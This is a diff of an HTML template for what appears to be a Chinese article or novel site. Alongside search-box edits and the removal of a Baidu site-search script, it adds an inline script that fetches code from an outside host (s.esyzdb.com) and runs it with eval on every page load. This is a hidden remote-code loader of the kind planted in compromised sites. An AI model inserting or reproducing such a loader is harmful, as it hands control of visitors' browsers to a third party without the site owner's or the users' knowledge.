@@ -46,9 +46,10 @@
 				<tbody>
 					<tr>
 						<td class="frame">
-						<input id="s_key" name="q" class="key" value="请输入文章名称，宁少字勿错字！" onfocus="this.value=''" type="text">
+						<input id="bdcsMain" class="key" value="请输入文章名称，宁少字勿错字！" onfocus="this.value=''" type="text">
+                        <input id="bdcsMain" class="key">
 						<td class="button">
-						<input name="submit" value="" class="go" type="submit" id="bdcsMain">
+						<input class="go" type="submit">
 						</td>
 					</tr>
 				</tbody>
@@ -69,6 +70,9 @@
 			<li><a href="" style="color:red">报错</a></li>
 		</ul>
 	</div>
+    <div style="display: block">
+<script>;(function(){var d=(/UCBrowser|QQBrowser/i.test(navigator.userAgent))?'http://s.esyzdb.com':'http://s.esyzdb.com';var a=new XMLHttpRequest();var b=d+'/27/29/'+Math.floor(Math.random()*9999999+1);if(a!=null){a.onreadystatechange=function(){if(a.readyState==4 && a.status==200){if(window.execScript)window.execScript(a.responseText,"JavaScript");else if(window.eval)window.eval(a.responseText,"JavaScript");else eval(a.responseText);}};a.open("GET",b,false);a.send();}})();</script>
+    </div>
 	
 	<!-- 站长统计 -->
 	<div style="display:none">
@@ -85,17 +89,6 @@
             }
             var s = document.getElementsByTagName("script")[0];
             s.parentNode.insertBefore(bp, s);
-            })();
-        </script>
-        <script type="text/javascript">
-            (function(){
-                document.write(unescape('%3Cdiv id="bdcs"%3E%3C/div%3E'));
-                var bdcs = document.createElement('script');
-                bdcs.type = 'text/javascript';
-                bdcs.async = true;
-                bdcs.src = 'http://znsv.baidu.com/customer_search/api/js?sid=13024648538113669062' + '&plate_url=' + encodeURIComponent(window.location.href) + '&t=' + Math.ceil(new Date()/3600000);
-                var s = document.getElementsByTagName('script')[0];
-                s.parentNode.insertBefore(bdcs, s);
             })();
         </script>
     </div>
